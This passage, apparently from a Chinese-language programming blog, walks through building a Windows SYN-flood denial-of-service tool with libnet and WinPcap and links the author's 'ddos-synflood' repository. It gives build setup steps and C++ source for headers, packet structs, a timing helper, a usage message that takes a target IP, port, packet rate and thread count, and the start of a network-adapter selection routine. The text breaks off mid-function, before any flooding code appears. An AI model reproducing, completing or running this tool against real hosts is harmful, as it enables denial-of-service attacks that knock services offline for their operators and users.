&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int8_t&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int16_t&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int32_t&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;现在你可以生成解决方案，如果生成成功，你将在 &lt;code&gt;E:\libnet-1.2-rc3\libnet\win32\Debug&lt;/code&gt; 下生成 &lt;code&gt;Libnet.dll&lt;/code&gt; 和 &lt;code&gt;Libnet.lib&lt;/code&gt;。将它们复制到 &lt;code&gt;C:\Windows\System32&lt;/code&gt; 和 &lt;code&gt;C:\Windows\SysWOW64&lt;/code&gt;。至此，LibNET 环境配置完成。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;工程环境配置&quot;&gt;&lt;a href=&quot;#工程环境配置&quot; class=&quot;headerlink&quot; title=&quot;工程环境配置&quot;&gt;&lt;/a&gt;工程环境配置&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;新建一个 VS 工程，目前工程为空。你可以从我托管在 GitHub 上的 &lt;a href=&quot;https://github.com/Forec/ddos-synflood&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;仓库&lt;/a&gt; 下载源代码：&lt;code&gt;SYNFlood.cpp&lt;/code&gt; 和 &lt;code&gt;wingetopt.h&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;设置工程：将 &lt;code&gt;E:\libnet-1.2-rc3\libnet\include&lt;/code&gt;、&lt;code&gt;E:\libnet-1.2-rc3\libnet\src&lt;/code&gt;、&lt;code&gt;E:\libnet-1.2-rc3\libnet\include\libnet&lt;/code&gt;、&lt;code&gt;E:\WpdPack\Include&lt;/code&gt;、&lt;code&gt;E:\WpdPack\Include\pcap&lt;/code&gt; 添加到工程的 VC++ 目录。&lt;/li&gt;
&lt;li&gt;添加 &lt;code&gt;E:\WpdPack\Lib&lt;/code&gt;、&lt;code&gt;E:\WpdPack\Lib\x64&lt;/code&gt;、&lt;code&gt;E:\libnet-1.2-rc3\libnet\win32\Debug&lt;/code&gt; 添加到工程的 VC++ 链接目录。&lt;/li&gt;
&lt;li&gt;在工程的链接器输入附加项中添加 &lt;code&gt;libnet.lib&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;将 &lt;code&gt;E:\libnet-1.2-rc3\libnet\win32\Debug&lt;/code&gt; 添加到链接器附加目录。&lt;/li&gt;
&lt;li&gt;生成可执行文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;头文件和宏定义&quot;&gt;&lt;a href=&quot;#头文件和宏定义&quot; class=&quot;headerlink&quot; title=&quot;头文件和宏定义&quot;&gt;&lt;/a&gt;头文件和宏定义&lt;/h1&gt;&lt;p&gt;工程使用到的头文件、宏定义、全局变量和结构体定义如下，其中：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;wingetopt.h&lt;/code&gt; 是为 Windows 平台编写的 POSIX 系统下的 &lt;code&gt;getopt.h&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;libnet_timersub&lt;/code&gt; 宏用于延时&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gettimeofday&lt;/code&gt; 是模仿 POSIX 系统下的 &lt;code&gt;gettimeofday&lt;/code&gt; 函数编写的 Windows 版本&lt;/li&gt;
&lt;li&gt;&lt;code&gt;usage&lt;/code&gt; 生成提示信息&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;lt;sys/utime.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;lt;libnet.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;wingetopt.h&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;lt;process.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;lt;pcap.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;pragma&lt;/span&gt; pack (&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;pragma&lt;/span&gt; comment(lib,&lt;span class=&quot;string&quot;&gt;&quot;wpcap.lib&quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;pragma&lt;/span&gt; comment(lib,&lt;span class=&quot;string&quot;&gt;&quot;ws2_32.lib&quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; PCAP_OPENFLAG_PROMISCUOUS &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; errbuf[PCAP_ERRBUF_SIZE];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; name[&lt;span class=&quot;number&quot;&gt;1001&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;preprocessor&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; libnet_timersub(tvp, uvp, vvp)                      \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;do &amp;#123;                                                        \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	(vvp)-&amp;gt;tv_sec = (tvp)-&amp;gt;tv_sec - (uvp)-&amp;gt;tv_sec;          \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    (vvp)-&amp;gt;tv_usec = (tvp)-&amp;gt;tv_usec - (uvp)-&amp;gt;tv_usec;       \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((vvp)-&amp;gt;tv_usec &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;                               \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        (vvp)-&amp;gt;tv_sec--;                                    \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        (vvp)-&amp;gt;tv_usec += &lt;span class=&quot;number&quot;&gt;1000000&lt;/span&gt;;                          \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;                                                       \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; while (&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;u_long dst_ip   = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;u_short dst_prt = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; speed = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; t_pack&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; libnet_ipv4_hdr ip;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; libnet_tcp_hdr tcp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;gettimeofday&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; timeval * tp, &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; timezone * tzp)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;uint64_t&lt;/span&gt; EPOCH = ((&lt;span class=&quot;keyword&quot;&gt;uint64_t&lt;/span&gt;)&lt;span class=&quot;number&quot;&gt;116444736000000000U&lt;/span&gt;LL);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	SYSTEMTIME  system_time;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	FILETIME    file_time;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;uint64_t&lt;/span&gt;    time;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	GetSystemTime(&amp;amp;system_time);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	SystemTimeToFileTime(&amp;amp;system_time, &amp;amp;file_time);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	time = ((&lt;span class=&quot;keyword&quot;&gt;uint64_t&lt;/span&gt;)file_time.dwLowDateTime);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	time += ((&lt;span class=&quot;keyword&quot;&gt;uint64_t&lt;/span&gt;)file_time.dwHighDateTime) &amp;lt;&amp;lt; &lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	tp-&amp;gt;tv_sec = (&lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt;)((time - EPOCH) / &lt;span class=&quot;number&quot;&gt;10000000L&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	tp-&amp;gt;tv_usec = (&lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt;)(system_time.wMilliseconds * &lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *nomenclature)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;fprintf&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;stderr&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&quot;\nusage: %s -t [-s -p]\n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&quot;\t-t target (ip.address.port: 192.168.1.193.80)\n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&quot;\t-s number of packets to send per second (defaults to max speed)\n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;string&quot;&gt;&quot;\t-p number of threads to send packets (defaults to 1)\n&quot;&lt;/span&gt; , nomenclature);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;选择网卡&quot;&gt;&lt;a href=&quot;#选择网卡&quot; class=&quot;headerlink&quot; title=&quot;选择网卡&quot;&gt;&lt;/a&gt;选择网卡&lt;/h1&gt;&lt;p&gt;函数 &lt;code&gt;select_adapter&lt;/code&gt; 用于选择发送 SYN 数据包的网卡，它将列出检测到的所有网卡并由用户输入选择。&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;select_adapter&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(pcap_t **handle)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;pcap_if_t&lt;/span&gt; *alldevs;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;pcap_if_t&lt;/span&gt; *d;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; inum, i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(pcap_findalldevs(&amp;amp;alldevs, errbuf) == -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;fprintf&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;stderr&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;Error in pcap_findalldevs: %s\n&quot;&lt;/span&gt;, errbuf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(d = alldevs; d; d = d-&amp;gt;next)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;%d. %s&quot;&lt;/span&gt;, ++i, d-&amp;gt;name);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (d-&amp;gt;description)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot; (%s)\n&quot;&lt;/span&gt;, d-&amp;gt;description);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot; (No description available)\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!i)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span 